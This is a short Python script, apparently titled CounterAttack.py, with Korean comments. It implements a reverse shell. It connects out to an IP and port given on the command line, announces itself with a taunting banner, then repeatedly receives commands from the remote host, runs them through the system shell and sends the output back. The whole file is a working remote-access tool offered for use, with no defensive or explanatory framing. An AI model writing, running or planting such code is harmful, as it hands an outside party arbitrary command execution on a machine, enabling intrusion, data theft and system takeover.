import os
import socket
import sys
import subprocess

def usage():
    print('사용법: CounterAttack.py <ip> <port>')
    sys.exit()

if len(sys.argv) < 3:
    usage()

s = socket.socket()
ip = sys.argv[1]
port = int(sys.argv[2])

try:
    s.connect((ip, port))
    s.send(
        b'-----------------------------------\n'
        b'-- Network connection successful --\n'
        b'----       It\'s my turn        ----\n'
        b'-----------------------------------\n'
    )

    while True:
        # 명령 수신
        command = s.recv(1024).decode().strip()
        if command.lower() == "exit":
            break

        # 명령 실행
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:  # 파이썬 버전이 3.7보다 낮을 경우
            output = e.output.decode() if isinstance(e.output, bytes) else str(e.output)
        except Exception as e:
            output = str(e)

        # 결과 전송
        s.send(output.encode())
except Exception as e:
    s.send(str(e).encode())
finally:
    s.close()
